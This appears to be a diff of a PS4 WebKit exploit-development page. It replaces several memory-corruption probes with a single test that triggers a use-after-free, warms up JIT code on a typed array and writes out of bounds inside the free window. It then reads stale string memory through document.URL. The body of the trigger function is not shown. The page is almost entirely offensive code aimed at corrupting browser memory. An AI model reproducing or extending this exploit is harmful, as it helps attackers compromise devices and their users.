@@ -2,23 +2,18 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit UAF – Slot Intersection Lab</title>
+<title>PS4 WebKit – UAF + JIT Window Fusion</title>
 <style>
-body { font-family: monospace; background:#000; color:#0f0; }
-button { margin:4px; padding:6px; }
-pre { white-space: pre-wrap; }
+body { background:#000; color:#0f0; font-family:monospace; }
+button { font-size:16px; padding:10px; }
+#log { white-space:pre-wrap; margin-top:10px; }
 </style>
 </head>
 <body>
 
-<h2>PS4 WebKit UAF – Slot Intersection Lab</h2>
-
-<button onclick="runStringDirection()">Direction B – Fragment / String</button>
-<button onclick="runTypedArrayDirection()">Direction A – TypedArray / DataView</button>
-<button onclick="runHistoryStateDirection()">Direction H – History.state</button>
-<button onclick="runJITDirection()">Direction C – JIT on Victim</button>
-
-<pre id="log"></pre>
+<h2>UAF + JIT (Inside Window Only)</h2>
+<button onclick="run()">RUN FINAL TEST</button>
+<div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
@@ -27,7 +22,6 @@ function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 /* ===============================
    PHASE 1 — CONFIRMED UAF TRIGGER
-   (DO NOT MODIFY)
    =============================== */
 async function triggerUAF(){
     log("=== UAF TRIGGER START ===");
@@ -49,108 +43,67 @@ async function triggerUAF(){
 }
 
 /* ===============================
-   COMMON READ PROBE
-   =============================== */
-function readURL(tag){
-    let u = document.URL;
-    log(`[${tag}] URL.length = ${u.length}`);
-    [32,64,128,256,512,1024].forEach(o=>{
-        let v;
-        try { v = u.charCodeAt(o); }
-        catch(e){ v = "EXC"; }
-        log(`[${tag}] charCodeAt(${o}) = ${v}`);
-    });
-}
-
-/* ===============================
-   DIRECTION B — FRAGMENT / STRING
-   =============================== */
-async function runStringDirection(){
-    logEl.textContent = "";
-    await triggerUAF();
-
-    readURL("BASE");
-
-    log(">>> FRAGMENT COLLAPSE <<<");
-    location.hash = "#X";
-    readURL("POST");
-    log("=== END DIRECTION B ===");
-}
-
-/* ===============================
-   DIRECTION A — TYPEDARRAY / DATAVIEW
-   =============================== */
-async function runTypedArrayDirection(){
-    logEl.textContent = "";
-    await triggerUAF();
-
-    readURL("BASE");
-
-    log("=== SLOT FIXATION (TypedArray/DataView) ===");
-    let sprays = [];
-    for(let i=0;i<4000;i++){
-        let ab = new ArrayBuffer(16);
-        sprays.push(new DataView(ab));
-    }
-
-    readURL("POST");
-    log("=== END DIRECTION A ===");
-}
-
-/* ===============================
-   DIRECTION H — HISTORY.STATE
-   =============================== */
-async function runHistoryStateDirection(){
-    logEl.textContent = "";
-    await triggerUAF();
-
-    log("[BASE] history.state = " + JSON.stringify(history.state));
-    readURL("BASE");
-
-    log("=== STATE CHURN ===");
-    history.replaceState({ctrl:"A"}, "", "#A");
-    history.replaceState({ctrl:"B"}, "", "#B");
-    setTimeout(()=>history.back(),0);
-
-    await sleep(10);
-
-    log("[POST] history.state = " + JSON.stringify(history.state));
-    readURL("POST");
-    log("=== END DIRECTION H ===");
-}
-
-/* ===============================
-   DIRECTION C — JIT ON VICTIM
+   PHASE 2 — JIT SETUP
    =============================== */
 function jitFunc(arr){
-    for(let i=0;i<1000;i++){
-        arr[0] = i;
+    let sum = 0;
+    for(let i=0;i<256;i++){
+        sum += arr[i & 15];
     }
-    return arr[0];
+    return sum;
 }
 
-async function runJITDirection(){
+function warmupJIT(arr){
+    for(let i=0;i<5000;i++)
+        jitFunc(arr);
+}
+
+/* ===============================
+   PHASE 3 — FINAL TEST
+   =============================== */
+async function run(){
     logEl.textContent = "";
+
     await triggerUAF();
 
-    readURL("BASE");
+    /* --- Snapshot string inside window --- */
+    let s = document.URL;
+    log("=== BASELINE READ (INSIDE WINDOW) ===");
+    log("URL.length = " + s.length);
+    [32,64,128,256,512,1024].forEach(o=>{
+        log(`charCodeAt(${o}) = ${s.charCodeAt(o)}`);
+    });
+
+    /* --- Prepare fake array for JIT --- */
+    let buf = new ArrayBuffer(0x40);
+    let arr = new Uint32Array(buf);
+    for(let i=0;i<arr.length;i++)
+        arr[i] = 0x41414141;
 
     log("=== JIT WARMUP ===");
-    let ta = new Uint32Array(4);
-    for(let i=0;i<10000;i++) jitFunc(ta);
+    warmupJIT(arr);
 
-    log("=== JIT PROBE ===");
-    try{
-        ta[4] = 0xdeadbeef;
-        log("[JIT] write/read idx 4 = 0x" + ta[4].toString(16));
-    }catch(e){
-        log("[JIT] exception");
+    /* --- CRITICAL: JIT LOOP INSIDE UAF WINDOW --- */
+    log("=== JIT OOB LOOP (INSIDE WINDOW) ===");
+    for(let i=0;i<20000;i++){
+        arr[16] = 0xdead0000 + (i & 0xff);
+        jitFunc(arr);
     }
 
-    readURL("POST");
-    log("=== END DIRECTION C ===");
+    /* --- CLOSE WINDOW --- */
+    log(">>> FRAGMENT COLLAPSE <<<");
+    location.hash = "#X";
+    await sleep(50);
+
+    /* --- POST COLLAPSE READ --- */
+    log("=== POST-COLLAPSE READ ===");
+    log("URL.length = " + s.length);
+    [32,64,128,256,512,1024].forEach(o=>{
+        log(`charCodeAt(${o}) = ${s.charCodeAt(o)}`);
+    });
+
+    log("=== TEST END ===");
 }
 </script>
-
 </body>
 </html>
